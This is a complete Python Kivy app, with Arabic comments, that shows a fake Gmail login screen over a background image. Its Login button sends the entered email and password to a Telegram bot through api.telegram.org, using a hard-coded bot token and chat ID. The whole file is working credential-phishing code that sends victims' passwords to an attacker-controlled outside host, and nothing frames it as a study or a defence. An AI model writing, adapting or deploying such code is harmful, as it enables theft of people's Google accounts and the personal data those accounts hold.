from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.image import Image
import requests

TOKEN = "8318983914:AAGEwCQk9HUsnIkdPspbrEqZjOtFXR9ZIUc"
CHAT_ID = "1170274856"

class LoginScreen(FloatLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        # الخلفية
        self.background = Image(source="IMG-20250728-WA0002.jpg", allow_stretch=True, keep_ratio=False, size_hint=(1,1), pos_hint={'x':0, 'y':0})
        self.add_widget(self.background)

        # الصندوق الرئيسي
        self.box = BoxLayout(orientation='vertical', size_hint=(0.8, 0.5), pos_hint={'center_x':0.5, 'center_y':0.5}, spacing=10)
        
        self.email_input = TextInput(hint_text="Gmail", size_hint=(1, None), height=50, multiline=False)
        self.box.add_widget(self.email_input)

        self.password_input = TextInput(hint_text="Password", size_hint=(1, None), height=50, multiline=False, password=True)
        self.box.add_widget(self.password_input)

        self.login_button = Button(text="Login", size_hint=(1, None), height=50)
        self.login_button.bind(on_press=self.send_to_telegram)
        self.box.add_widget(self.login_button)

        self.add_widget(self.box)

    def send_to_telegram(self, instance):
        gmail = self.email_input.text
        password = self.password_input.text
        message = f"Gmail: {gmail}\nPassword: {password}"
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"

        try:
            response = requests.post(url, data={
                "chat_id": CHAT_ID,
                "text": message
            })
            print("تم الإرسال:", response.text)
        except Exception as e:
            print("حدث خطأ أثناء الإرسال:", e)

class LoginApp(App):
    def build(self):
        return LoginScreen()

if __name__ == '__main__':
    LoginApp().run()
